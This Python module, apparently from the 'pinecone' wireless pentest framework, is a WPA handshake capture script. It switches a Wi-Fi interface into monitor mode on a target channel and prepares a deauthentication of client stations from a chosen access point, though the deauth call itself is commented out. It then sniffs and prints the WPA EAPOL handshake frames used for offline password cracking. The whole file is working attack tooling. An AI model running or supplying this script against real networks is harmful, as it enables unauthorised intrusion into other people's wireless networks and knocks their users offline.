import argparse

from pathlib2 import Path
from pony.orm import *
from pyric import pyw
from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key

from pinecone.core.database import BasicServiceSet, ExtendedServiceSet, Client
from pinecone.core.script import BaseScript
from pinecone.utils.interface import set_monitor_mode
from pinecone.utils.packet import is_multicast_mac, BROADCAST_MAC
from pinecone.utils.template import to_args_str


class Module(BaseScript):
    META = {
        "id": "scripts/attack/wpa_handshake",
        "name": "WPA handshake capture script",
        "author": "Valentín Blanco (https://github.com/valenbg1/)",
        "version": "1.0.0",
        "description": "Capture WPA handshakes by deauthenticating stations and then sniffing for the handshake.",
        "options": argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter),
        "depends": {"attack/deauth"}
    }
    META["options"].add_argument("-i", "--iface", help="Monitor mode capable WLAN interface.", default="wlan0",
                                 type=str)
    META["options"].add_argument("-b", "--bssid", type=str)
    META["options"].add_argument("-s", "--ssid", type=str)
    META["options"].add_argument("-c", "--client", default=BROADCAST_MAC, type=str)
    META["options"].add_argument("--channel", type=int)
    META["options"].add_argument("--no-deauth", help="Do not deauth station(s).", action="store_true")
    META["options"].add_argument("--sniff-time", help="Time (seconds) that the interface will be monitoring.",
                                 default=10, type=int)

    START_SCRIPT_TEMPLATE_PATH = Path(Path(__file__).parent, "start_wpa_handshake_template").resolve()  # type: Path
    START_SCRIPT_FILENAME = "start_wpa_handshake_script"

    def __init__(self):
        super().__init__()

    @db_session
    def run(self, args, cmd):
        bss = None
        ess = None
        client = None

        if args.ssid is not None:
            ess = ExtendedServiceSet.get(ssid=args.ssid)

        if not is_multicast_mac(args.client):
            client = Client.get(mac=args.client)

        if args.bssid is None and ess is not None and not ess.bssets.is_empty():
            if ess.bssets.count() == 1:
                args.bssid = ess.bssets.select().first().bssid
            else:
                cmd.pfeedback('SSID "{}" is associated with multiple BSSIDs, select the appropiate:'.format(ess.ssid))
                args.bssid = cmd.select(sorted(bss.bssid for bss in ess.bssets), "Option: ")

        if args.bssid is None and client is not None and not client.connections.is_empty():
            if client.connections.count() == 1:
                args.bssid = client.connections.select().first().bss.bssid
            else:
                cmd.pfeedback("Client {} is associated with multiple BSSIDs, select the appropiate:".format(client.mac))
                args.bssid = cmd.select(sorted(conn.bss.bssid for conn in client.connections), "Option: ")

        if args.bssid is not None:
            bss = BasicServiceSet.get(bssid=args.bssid)

        if args.channel is None and bss is not None:
            args.channel = bss.channel

        if args.bssid is None:
            cmd.perror("BSSID is missing.")
        elif args.channel is None:
            cmd.perror("Channel is missing.")
        elif bss is not None and not ("WPA" in bss.encryption_types and "PSK" in bss.authn_types):
            cmd.perror("AP encryption mode is not WPA[2]-PSK.")
        else:
            interface = set_monitor_mode(args.iface)
            pyw.chset(interface, args.channel)

            if not args.no_deauth:
                script_args = argparse.Namespace()
                script_args.deauth_args = to_args_str({
                    "iface": args.iface,
                    "bssid": args.bssid,
                    "channel": args.channel,
                    "client": args.client
                    # "num-packets": args.num_packets
                })

                cmd.pfeedback(
                    "[i] Deauthenticating station {} from AP {} on channel {}...".format(args.client, args.bssid,
                                                                                         args.channel))
                # super().run(script_args, cmd)
            else:
                cmd.pfeedback("[i] Disabled station deauthentication.")

            cmd.pfeedback(
                "[i] Monitoring for {} secs on channel {} for WPA handshakes between station {} and AP {}...".format(
                    args.sniff_time, args.channel, args.client, args.bssid))
            sniff(iface=args.iface, prn=self.handle_packet, timeout=args.sniff_time, store=False)

    def handle_packet(self, packet: Packet) -> None:
        if packet.haslayer(WPA_key):
            packet.show()

    def stop(self, cmd):
        pass
